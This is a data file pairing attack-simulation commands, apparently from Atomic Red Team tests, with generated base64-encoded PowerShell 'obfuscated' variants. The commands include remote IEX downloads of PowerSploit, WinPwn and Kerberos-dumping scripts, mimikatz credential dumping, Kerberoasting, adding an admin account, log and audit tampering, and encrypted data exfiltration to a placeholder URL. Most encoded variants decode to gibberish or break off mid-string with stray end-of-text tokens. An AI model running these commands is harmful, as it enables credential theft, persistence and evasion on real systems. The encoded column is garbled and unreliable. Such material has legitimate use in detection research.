net group ""domain admins"" /domain","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('bmV0LW5hbWUgd2l0aCB7ZmlsZSAtIHtmaXJzdF92YWxpZC1jIC1saXN0fQ==')) | Invoke-Expression"""
"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainGroup -verbose","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('TWFyaW9uIGlkPSJQYXRoRmV0aWNsaWVudFR5cGVjLzEtMCAtU0xhc3RHcm91bmQuZGUiICN7dmlldyAje2hhbmdlY2g"
"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1"" -UseBasicParsing)
Invoke-Maldoc -macroFile ""PathToAtomicsFolder\T1070.001\src\T1070.001-macrocode.txt"" -officeProduct ""Word"" -sub ""ClearLogs""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('RXhwb3J0IC9cL25vcmUvcGFzc3dvcmQvbWVtYmVycyAkQnVuZGVzaWEgZmlsZS5leGU=')) | Invoke-Expression"""
"$plaintext = ([system.Text.Encoding]::UTF8.getBytes(""#{plaintext}""))
$key = ""#{key}""
$cyphertext =  @();
for ($i = 0; $i -lt $plaintext.Count; $i++) {
 $cyphertext += $plaintext[$i] -bxor $key[$i % $key.Length];
}
$cyphertext = [system.Text.Encoding]::UTF8.getString($cyphertext)
[System.Net.ServicePointManager]::Expect100Continue = $false
Invoke-WebRequest -Uri #{destination_url} -Method POST -Body $cyphertext -DisableKeepAlive","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JGNmaWxlIHN5c3RlbSBzZWNyZXQgLVwuKlBpbm9tYmFsbCAtLS1zZXJ2aWNlfSAje3tleXMgIlN0YXJ0IFdvcmtza"
"reg query ""HKEY_LOCAL_MACHINE\Software\Microsoft\Internet Explorer"" /v svcVersion","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIG1haWwuZXhlICN7d2luZG93LmRlYmlsIiAje2t0aGVybS5jb20gIkFETUlOLmhvc3Q=')) | Invoke-Expression""<|endof"
"type C:\Windows\Panther\unattend.xml
type C:\Windows\Panther\Unattend\unattend.xml","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cGF0aH0gLXRlYW1sICN7ZmlsZV9maWxlfSI=')) | Invoke-Expression"""
dir c:\ /b /s .key | findstr /e .key,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZG9uLmNvbSAtY2F0aW5nIC1jIGJhc2ggYXRocnkgI3twcm9qZWN0CiAgIGNvdW5kIDEgfSAje3tleSBQdWxwaWRzIFRoaW"
reg add HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Explorer /v DisableNotificationCenter /t REG_DWORD /d 1 /f,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIGFkZCAiUE9TVUxNX0JPTk5TXFByb2plY3QgMjAwMDAgLTEuMSAiI3gtTGVhcmlzIEpldCAtRXhwZWN0ZWQ=')) | In"
"tasklist.exe
sc query
sc query state= all","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('dmlld19kYXRhIC0tIHsgLUludGVyZmFjZSBSb2xlIEZvcmdlfQ==')) | Invoke-Expression"""
msiexec /y {PATH_ABSOLUTE:.dll},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyAje2RvY3VtZW50IiN7cmVmfSBmaXJzdF9pZCAjL1JlYWRfcGljdHVyZSIgMzQ=')) | Invoke-Expression""<|endoftext|"
Start-Process #{UltraVNC_Viewer_Path},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U2Nsb3QgI3tleGFtcGxlIC9Kb2N1bWVudC5qcGci')) | Invoke-Expression"""
"""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"" -f (objectcategory=computer) #{optional_args}","\""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe\"" -f (objectcategory=computer)     """"(objectcategory=computer)""""-f (objectcategory=computer)     ""<|end"
"""#{psexec_path}"" /accepteula \\#{machine} -c #{mimikatz_path} ""lsadump::lsa /inject /id:500"" ""exit""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JGhhIHNvY2tldCByZXR1cmUgLSAtPiAvUG9zdCAic3VwbG9hZCB7IFBQTSBKICAgICAjeSA9ICAtIGFsbFRyYWlsdGVyIDIK')) | In"
net.exe start >> #{output_file},"net.exe start >> ||| """" ""start"" >> """" -- -- ---- -- start><|end"
Pcwrun.exe /../../$(calc).exe,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Q3Jvc3RhbCAiL1BhdGgi')) | Invoke-Expression"""
"$oldvalue = $(Get-ItemProperty HKLM:\System\CurrentControlSet\Control\Lsa -Name 'Security Packages' | Select-Object -ExpandProperty 'Security Packages');
Set-ItemProperty -Path ""HKLM:\System\CurrentControlSet\Control\Lsa"" -Name 'Security Packages old' -Value ""$oldvalue"";
$newvalue = ""AtomicTest.dll"";
Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa -Name 'Security Packages' -Value $newvalue","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JGN7aW5nIGRlY2ggZGF0YSdzb3VyIC9zZXQ=')) | Invoke-Expression"" ||| . ||| Microsoft.PowerShell.Core\Invoke-Expression . {Text.Encoding}::UTF8.GetString(["
Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType #{command_line_switch_type} -CommandParamVariation #{command_param_variation} -UseEncodedArguments -EncodedArgumentsParamVariation #{encoded_arguments_param_variation} -Execute -ErrorAction Stop,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JVNiYWNrdXBfbG9naW5fZGVmZ2h0IC1Mb3dldFxwIHtcZXRjLWRlcmlzYXRpb24gc3ltYm9s')) | Invoke-Expression""<|endof"
"Import-Module AADInternals -Force
$saml = New-AADIntSAMLToken -ImmutableID ""#{immutable_id}"" -PfxFileName ""#{certificate_path}"" -Issuer ""#{issuer_uri}""
$conn = Get-AADIntAccessTokenForAADGraph -SAMLToken $saml -SaveToCache
if ($conn) { Write-Host ""`nSuccessfully connected as $($conn.User)"" } else { Write-Host ""`nThe connection failed"" }
Write-Host ""End of Golden SAML""","powershell Import-Module AADInternals -Force $saml = New-AADIntSAMLToken -ImmutableID """" -PfxFileName """" -Issuer """" $conn = Get-AADIntAccessTokenForAADGraph -SAMLToken $saml -SaveToCache if ($conn) { Write-Host ""`nSuccess"
"reg add ""HKCU\Software\Microsoft\Office\16.0\Word\Options"" /v STARTUP-PATH /t REG_SZ /d ""C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Recent"" /f","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIGFkdm9pY2VEcmlwdGVxb3BzICN7ZXhlYyAje2luZm8gLW5hbWUSd2l0aCAiRXJyb3IucGhwIjEwMDM=')) |"
"net user #{user_account} #{new_user_password} /add
net.exe user #{user_account} #{new_password}","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('bmV0cmlvZGluZyBmaWxlIC9kdXI=')) | Invoke-Expression"""
MavInject.exe 3110 /INJECTRUNNING {PATH_ABSOLUTE:.dll},MavInject.exe 3110 /INJECTRUNNING {PATH_ABSOLUTE:.dll} ||| ```
"sudo cp #{path_malicious_plist} /Library/LaunchDaemons/#{plist_filename}
sudo launchctl load -w /Library/LaunchDaemons/#{plist_filename}","sudo cp """"launchctl load -w /Library/LaunchDaemons/""""#{plist_filename} sudo launchctl load -w /Library/LaunchDaemons/""""#{plist_filename}<|end"
rm -rf #{folder_to_delete},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y21iNXMgLWNvbG9yICdkaWdlc3QgZmlsZVxkbCAje25hbWUgcHJvamVjdCByaWdodCAtIFRoZSB7aXRlZCBtZXNzY"
if (ioreg -l | grep -e Manufacturer -e 'Vendor Name' | grep -iE 'Oracle|VirtualBox|VMWare|Parallels') then echo 'Virtualization Environment detected'; fi;,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c2F5dG9wX3N0YXRzIHt7ZGVmaW5pdCAtMTIgLU1lbWNvbnNfaWFuICJleHRyYWRhbGRpbiBleHRyYWNrIC1jcm9kIGFkZ"
"osascript -e 'do shell script ""rm #{system_log_path}"" with administrator privileges'","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y3N2ZXJ0IHtleGUgLUNvbW1lbnQgIiRhcHRpbm9AIGFzc2V0cy5jcmVhdGVkICIvIFNlbGVjdCAtIHNlbGVjdCB7dXB"
"klist purge
cmd.exe /c ""#{local_folder}\#{local_executable}"" kerberoast #{flags} /outfile:""#{local_folder}\#{out_file}""","klist purge cmd.exe ""/c"" ""\""\""kerberoast ""\""\"", \""\""/outfile:\""""\"",""\""\""\""\"";\"""" -f 2 --debug-log 2>&1 |"
"if (-not (Test-Path #{dest_path})) {
New-Item -Path #{dest_path} -ItemType Directory
} else {
Write-Host ""Directory #{dest_path} already exists."" }
Copy-Item -Path ""C:\windows\system32\customshellhost.exe"" -Destination ""#{dest_path}\customshellhost.exe"" -Force
Copy-Item -Path ""C:\windows\system32\calc.exe"" -Destination ""#{dest_path}\explorer.exe"" -Force
#{dest_path}\customshellhost.exe","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZWNobyBMaXN0cGFzcyAiTWluZm9yc2VydE1vYmlsICJTdW1tZXRlclxQcm9jZXMgI3twYXlsb2FkLmNvbS5jb20"
"Send-MailMessage -From #{sender} -To #{receiver} -Subject ""T1048.003 Atomic Test"" -Attachments #{input_file} -SmtpServer #{smtp_server}","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('R2V0LUZvcmFwcC5leGUgIiN7bml0IC9zYWxlcy5hcnJlYXQucHJvdG9jb2w=')) | Invoke-Expression"""
"env | grep LANG
printenv LANG
set | grep LANG",env|grepLANGprintenv LANGset|grepLANG<|endoftext|
"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1"" -UseBasicParsing)
Invoke-Maldoc -macroFile ""PathToAtomicsFolder\T1555\src\T1555-macrocode.txt"" -officeProduct ""Word"" -sub ""Extract""","[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 IEX (iwr ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1"" -UseBasicParsing) Invoke-Maldoc -macroFile PathToAtomicsFolder\T15"
"TEST=$(echo $HISTFILE)
echo $HISTFILE
export HISTFILE=""/dev/null""
echo ""runnning some commands to populate the history""
whoami
groups
if [ $(echo $HISTFILE) == ""/dev/null"" ]; then echo ""\$HISTFILE is /dev/null""; else HIST_LENGHT=$(wc -l $HISTFILE); echo ""\$HISTFILE is not /dev/null, history lenght is $HIST_LENGHT"";  fi","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('V1NZUE5hbWUgVEFfQ29uZmlndXJhdGlvbiB7bmV3IHRoaXMgcHJvamVjdA==')) | Invoke-Expression"""
takeown.exe /f #{file_folder_to_own} /r,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('dGFuZCAtc29jaWFsIC13aXRoIC1maWxlLCAiRmlyZXN0IFJlYWRpbicgPiAvdmVyc2lvbiBQcmVkaWNhdGVzIHNlbGVjdCB7IGtle"
"rundll32.exe url.dll,OpenURL file://^C^:^/^W^i^n^d^o^w^s^/^s^y^s^t^e^m^3^2^/^c^a^l^c^.^e^x^e","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cGh0IHsgR2VuZXJhdGVkIC1Mb2NhbCA9IGFuZCBzaGEgYW5kLWxlbmQgfSB7IGNvbnRlbnQtTWVzc2FnZSAtUHJvdmlk"
"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1"" -UseBasicParsing) 
Invoke-MalDoc -macroFile ""PathToAtomicsFolder\T1055.012\src\T1055.012-macrocode.txt"" -officeProduct ""#{ms_product}"" -sub ""Exploit""",[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 IEX (iwr https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1 -UseBasicParsing) Invoke-MalDoc -macroFile PathToAtomicsFolderT1055.
print /D:{PATH_ABSOLUTE:.dest.exe} {PATH_SMB:.source.exe},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyAje2NvcmUgL1BhcnRuZXQgIiAvZGVmaW5pdCB7dHJhaWxlIC90b2tlbnM=')) | Invoke-Expression"" ||| ``` ||| ## At"
"Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy RemoteSigned -ErrorAction Ignore
$url = ""https://raw.githubusercontent.com/hlldz/Invoke-Phant0m/f1396c411a867e1b471ef80c5c534466103440e0/Invoke-Phant0m.ps1""
$output = ""$env:TEMP\Invoke-Phant0m.ps1""
$wc = New-Object System.Net.WebClient
$wc.DownloadFile($url, $output)
cd $env:TEMP
Import-Module .\Invoke-Phant0m.ps1
Invoke-Phant0m","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZWNobyAiQ2FudGVzdCAvZmlsZSBleGUgLXJlYWxseSBkb2NfaWRfb3BlcmF0aW9uICVtYXJnaWxsX2RhdGEiIHhtdG9yYX"
chown -R #{owner} #{file_or_folder},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y2hhbGxlciAje3tleSAje1x0ZXN0LW5hbWV9')) | Invoke-Expression"""
Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/MzHmO/PowershellKerberos/beed52acda37fc531ef0cb4df3fc2eb63a74bbb8/dumper.ps1'),"Invoke-Execution(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/MzHmO/PowershellKerberos/beed52acda37fc531ef0cb4df3fc2eb63a74bbb8/dumper.ps1')  Invoke-Exe;cution(New-Obje,ct N"
"rundll32.exe ieframe.dll,OpenURL {PATH_ABSOLUTE:.url}","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3RhcnQgYm9yZGVyICN7dHJ1ZX0=')) | Invoke-Expression"""
"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (IWR 'https://raw.githubusercontent.com/Kevin-Robertson/Invoke-TheHash/01ee90f934313acc7d09560902443c18694ed0eb/Invoke-WMIExec.ps1' -UseBasicParsing);Invoke-WMIExec -Target #{target} -Username #{user_name} -Hash #{ntlm} -Command #{command}","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('UmVxdWlyZSAtICRNYXRjaGFzczEgLTEpJiAvdjEuMTMuNDcuMDAwOyBtZSBleGVjayAje2hvd2luZyAzNTkuMTAuMDA=')) |"
"bash -c 'trap ""nohup sh $PathToAtomicsFolder/T1546.005/src/echo-art-fish.sh"" EXIT'","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3NjaGVsbC97bGxpY2FsICRyZXNvbHV0aW9uICdBbm5vdCBleHRlcm4gLVBhcnQgMjAxNTUyMTIzMCAtIGJyb3dzZXIg"
net.exe stop #{service_name},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cGxyZXN1bHQtaGVsbCAje3tleSAiIyR0aW1lLVByb2plY3QtcmFuZG9tb3MgICAgIE5hbWUgLSAtIFBsZWFzZSBub25j"
msiexec /quiet /i {PATH:.msi},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('bmV0cmlvIC9wZXJtaW5pc3RlbnQgL21ldGFkYXRhIC9jIG1hdHJpeCAtYmx1ZyB7dGVtcGxhdGVzKCAqI3tmaWxlfSB"
"Copy ""PathToAtomicsFolder\T1137.006\bin\Addins\ExcelVBAaddin.xlam"" ""$env:APPDATA\Microsoft\Excel\XLSTART\notepad.xlam""        
Start-Process ""Excel""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JG5vbWUgIiN7ZmllbGRzIC97c2luYy9jYXRhbG9nfQ==')) | Invoke-Expression"" ||| ```"
msbuild.exe {PATH:.proj},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZXhwb3J0IC9Qcml2YWN5fQ==')) | Invoke-Expression"""
tar -xf {PATH}:ads,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyAje29iamFjdGVyX3R5cGU=')) | Invoke-Expression"""
swift #{swift_src} -keylog,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c2NhbGwgI3tmaWxlX21vZHVsZSB7dGltZXMgaXBzdW0uY29tCiAgLnR4dA==')) | Invoke-Expression"""
"Send-MailMessage -From #{sender} -To #{receiver} -Subject 'T1027_Atomic_Test' -Attachments ""#{input_file}"" -SmtpServer #{smtp_server}","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U3RhcnQgLW5ldA==')) | Invoke-Expression"""
"iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpWatson.ps1')
Invoke-watson","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cGhvbmV0b2NrIHRoaXMuIC9kZWNyZWF0dFdpdC5zdGFjayAje3toYWlfZGVjb2RlLmNvbTogJ2hlbiAje3toYWlfa"
"reg add ""HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"" /v ProxyEnable /t REG_DWORD /d 1 /f","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIGRvbWFpbg==')) | Invoke-Expression"""
"Import-Module ""PathToAtomicsFolder\..\ExternalPayloads\PowerView.ps1""
Invoke-ShareFinder #{parameters}","powershell -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U2V0LW5hbWV9IC97ZXRfcmVxdWVzdC9GYWNlc3QgTmFtZX0KIiAvPiB7eyJpZCI6ImEwMDAifSxcInNvdXJjZV"
"echo -n 111-11-1111 | b64encode -r -
curl -XPOST #{base64_data}.#{destination_url}","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZWNobyBhIHNlc3Npb25zIGFjY2VwdCAtMC4x')) | Invoke-Expression"""
"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Invoke-EnumerateLocalAdmin  -Verbose","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('W3sgZXhlICRhYmxlIGFzIGV4cGxvdyAje3Byb2NlcmVycyAjcnVubmluZyAtYWNjb3VudCkgeyBidXNpbmcgLXRlbGV0Z"
echo T1486 - Purelocker Ransom Note > %USERPROFILE%\Desktop\YOUR_FILES.txt,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZWNobyBXaW5kb3dzIHRoaXMgTmFtZSBJbnRQb2xpYiAtcGFyayAjSEFkZCAiUGVuZCBMaWxlfSI=')) | Invoke-Expression""<|endoftext"
Scriptrunner.exe -appvscript {PATH:.exe},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('R2V0LUJvbGxlY3QgIiN7cm9sZXdzIHNob3cgICAgICAgICB7dGVtcGxhdGUgfSI=')) | Invoke-Expression"""
"$excelApp = New-Object -COMObject ""Excel.Application""
if(-not $excelApp.path.contains(""Program Files (x86)"")){
    Write-Host ""64-bit Office""
    Copy ""PathToAtomicsFolder\T1137.006\bin\Addins\excelxll_x64.xll"" ""$env:APPDATA\Microsoft\AddIns\notepad.xll""
}
else{
  Write-Host ""32-bit Office""
  Copy ""PathToAtomicsFolder\T1137.006\bin\Addins\excelxll_x86.xll"" ""$env:APPDATA\Microsoft\AddIns\notepad.xll""
}
$ver = $excelApp.version
$ExcelRegPath=""HKCU:\Software\Microsoft\Office\$Ver\Excel\Options""
Remove-Item $ExcelRegPath -ErrorAction Ignore
New-Item -type Directory $ExcelRegPath | Out-Null
New-ItemProperty $ExcelRegPath OPEN -value ""/R notepad.xll"" -propertyType string | Out-Null
$excelApp.Quit()
Start-Process ""Excel""","$excelApp = New-Object -COMObject ""Excel.Application"" if(-not $excelApp.path.contains(""Program Files (x86)"")) { Write-Host ""64-bit Office"" Copy PathToAtomicsFolder\T1137.006\bin\Addins\excelxll_x64.xll $env:APPDATA\Microsoft\AddIns\notepad.xll } else { Write-"
"New-ItemProperty -Path HKLM:""\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Custom"" -Name ""AtomicRedTeamT1546.011"" -Value ""AtomicRedTeamT1546.011""
New-ItemProperty -Path HKLM:""\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\InstalledSDB"" -Name ""AtomicRedTeamT1546.011"" -Value ""AtomicRedTeamT1546.011""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Q2hlY2tQcm9maWxlX3RvX2JpbmFyeSIje2lkZW50aWZpZXIgIiN7ZmllbGRzLnBocC5jb21wbGVhcHVzIC9zdG"
"iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
kittenz -consoleoutput -noninteractive",iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1') kittenz -consoleoutput -noninteractive
cat #{sh_history_filename} | grep #{sh_history_grep_args} > #{output_file},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y2F0IC9kZXN0cmljdGlvbnMvRm9ybWF0dGVyVHlwZS5leGUgL1Jvb3Q=')) | Invoke-Expression"""
"Start-Process ""#{Splashtop_Path}""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U2VsZXhpc3RvbGxlcy5leGVjdXRlLmFzcHYgIiAvIC0tPiAje3NvdWxkIC97dXJyb3JfdmlzaW9uX2luIC1wID4+IC"
ilasm.exe {PATH_ABSOLUTE:.txt} /exe,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cGFja2FnZXN9')) | Invoke-Expression"""
fsutil.exe file setZeroData offset=0 length=9999999999 {PATH_ABSOLUTE},"""f""""s""""u""""t""""i""""l""""e"""".""""""f""""i""""l""""e"""" s""""e""""t""""Z""""e""""r""""o""""D""""a""""t""""a"""" o""""f""""f""""s""""e""""t=""""0"""" l""""e""""n""""g""""th=""""9""""9""""9""""9""""9""""9""""9""""{PATH_ABSOLUTE}"" =<|endoftext|"
"echo '! exec ""/bin/sh &""' | PERL_MM_USE_DEFAULT=1  cpan","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZWNobyBjaGFyIC9wYXNzd29yZC5jcnlwdGVkfQ==')) | Invoke-Expression"""
"wmic.exe process call create ""{CMD}""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyAiL2NvbW1vbiIjeHMiOiJzaGEtcG9ydCAtdGFjay5qcyIsICJ7ZXhlIGRlZmF1bHRfbmQgdGVzdCBkb21haW4uY"
"sed -i '$ a #art_test_1562_006_1' /etc/audisp/#{audisp_config_file_name}
if [ -f ""/etc/#{auditd_config_file_name}"" ];
then sed -i '$ a #art_test_1562_006_1' /etc/#{auditd_config_file_name}
else sed -i '$ a #art_test_1562_006_1' /etc/audit/#{auditd_config_file_name}
fi 
sed -i '$ a #art_test_1562_006_1' /etc/#{libaudit_config_file_name}","sed -i $ a #art_test_1562_006_1 /etc/audisp/#{audisp_config_file_name} if [ -f ""/etc/#{auditd_config_file_name}"" ]; then sed -i $ a #art_test_1562_006_1 /etc/#{auditd_config_file_name} else sed -i $ a #art_test"
"(([adsisearcher]'').SearchRooT).Path | %{if(([ADSI]""$_"").gPlink){Write-Host ""[+] Domain Path:""([ADSI]""$_"").Path;$a=((([ADSI]""$_"").gplink) -replace ""[[;]"" -split ""]"");for($i=0;$i -lt $a.length;$i++){if($a[$i]){Write-Host ""Policy Path[$i]:""([ADSI]($a[$i]).Substring(0,$a[$i].length-1)).Path;Write-Host ""Policy Name[$i]:""([ADSI]($a[$i]).Substring(0,$a[$i].length-1)).DisplayName} };Write-Output ""`n"" }}","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cG9zdF9maWxlIHtQYXJhbUZpbGVuY2llcyAje3Byb2dyZWdhdGVzCmNvbnRlbnQtVHlwZSAje3Byb2dyZWdhdGVzCjE"
unlink /var/log/messages,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIGFjY291bnRzLmNvZGUgdGVzdCAtcHJvamVjdA==')) | Invoke-Expression"""
get-ADPrincipalGroupMembership #{user} | select name,"powershell -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cG90aGVyX3BhcnRpY2FsLmNvbTppbWFnZV9zaWRlfQ==')) | Invoke-Expression"""
"netsh.exe advfirewall  show allprofiles 
netsh.exe advfirewall firewall dump
netsh.exe advfirewall show currentprofile
netsh.exe advfirewall firewall show rule name=all
netsh.exe firewall show state
netsh.exe firewall show config
sc query windefend
powershell.exe /c ""Get-Process | Where-Object { $_.ProcessName -eq 'Sysmon' }""
powershell.exe /c ""Get-Service | where-object {$_.DisplayName -like '*sysm*'}""
powershell.exe /c ""Get-CimInstance Win32_Service -Filter 'Description = ''System Monitor service'''""
tasklist.exe
tasklist.exe | findstr /i virus
tasklist.exe | findstr /i cb
tasklist.exe | findstr /i defender
tasklist.exe | findstr /i cylance
tasklist.exe | findstr /i mc
tasklist.exe | findstr /i ""virus cb defender cylance mc""",powershell.exe /c Get-Process | Where-Object { $_.ProcessName -eq 'Sysmon' } netsh.exe advfirewall  show allprofiles ||| netsh.exe advfirewall firewall dump netsh.exe advfirewall show currentprofile netsh.exe advfirewall firewall show rule name=all ||| netsh.exe firewall show state ||| netsh.exe firewall show config sc query windefend tasklist.exe | findstr
"hh.exe ""#{local_chm_file}""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Z3VycmVuY2UgIi9wbGF0ZXJhc20vRW5kdWNlbnNpdGVzIC1Aa2luZCAicHJldmlvdXM=')) | Invoke-Expression"""
"if [ ""$(csrutil status | grep -v 'enabled')"" != """" ]; then echo 'Possible Virtualization Environment detected'; fi;","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('IiN7YWxsZXJpbmdTdHJpbmcgL2FwaQ==')) | Invoke-Expression"" ||| if [[ $(csrutil status | grep -v enabled) ]]; then echo 'Possible Virtualization Environment detected' fi;"
"which_python=$(which python || which python3 || which python3.9 || which python2)
$which_python -c 'import requests;import os;url = ""#{script_url}"";malicious_command = ""#{executor} #{payload_file_name} #{script_args}"";session = requests.session();source = session.get(url).content;fd = open(""#{payload_file_name}"", ""wb+"");fd.write(source);fd.close();os.system(malicious_command)'","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3RhcnRzLCAiZXhlIHt7IC1jYWxsYS5jbGFzcyAje0NvbnRyYWN0fQ==')) | Invoke-Expression"""
"net user /add ""#{username}"" ""#{password}""
net localgroup administrators ""#{username}"" /add","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('b3N0cmluZyAtLXRvbmUgI3tjb25maWcgKG9wZW5pemVkIC1mYWxzZTs=')) | Invoke-Expression"""
